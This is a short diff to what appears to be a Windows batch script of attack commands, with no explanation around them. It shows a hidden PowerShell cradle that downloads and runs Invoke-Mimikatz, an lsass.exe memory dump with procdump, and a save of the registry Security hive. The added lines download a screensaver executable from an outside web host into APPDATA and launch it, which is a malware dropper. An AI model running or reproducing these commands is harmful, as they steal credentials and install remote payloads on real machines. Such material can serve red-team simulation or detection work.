@@ -383,6 +383,8 @@ nltest /dclist:abc.local
 ECHO ============================
 cmd.exe /c powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')"
 ECHO ============================
+cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -command (New-Object System.Net.WebClient).DownloadFile("http://alvarezborja.com/jashebc5ujpsed/podkjfnvb3sidje", "$env:APPDATApole.scr" );Start-Process( "$env:APPDATApole.scr" )
+ECHO ============================
 procdump.exe -ma lsass.exe C:\Users\Administrator\Desktop\x64\lsass.dmp
 ECHO ============================
 reg save HKLM\Security security.hive
